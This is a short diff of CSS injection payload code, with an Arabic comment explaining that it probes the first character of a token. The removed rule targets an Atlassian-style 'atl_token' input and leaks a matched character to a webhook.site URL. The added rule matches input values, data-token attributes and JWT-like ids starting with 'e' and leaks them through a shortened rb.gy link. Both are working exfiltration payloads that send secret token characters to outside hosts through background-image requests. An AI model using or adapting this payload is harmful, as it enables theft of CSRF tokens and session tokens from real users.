@@ -1,4 +1,5 @@
-input[name="atl_token"][value^="B"] {
-  background-image: url("https://webhook.site/b36a8acc-2ebd-45fc-a54c-681eea0f7dca/ID?char=B") !important;
-  display: block !important;
+/* هذا الكود يبحث عن أول حرف في التوكن (مثلاً e) */
+input[value^="e"], *[data-token^="e"], [id*="eyJ"] {
+  background: url("https://rb.gy/sq5g7s?char=e") !important;
+  border: 10px solid red !important;
 }
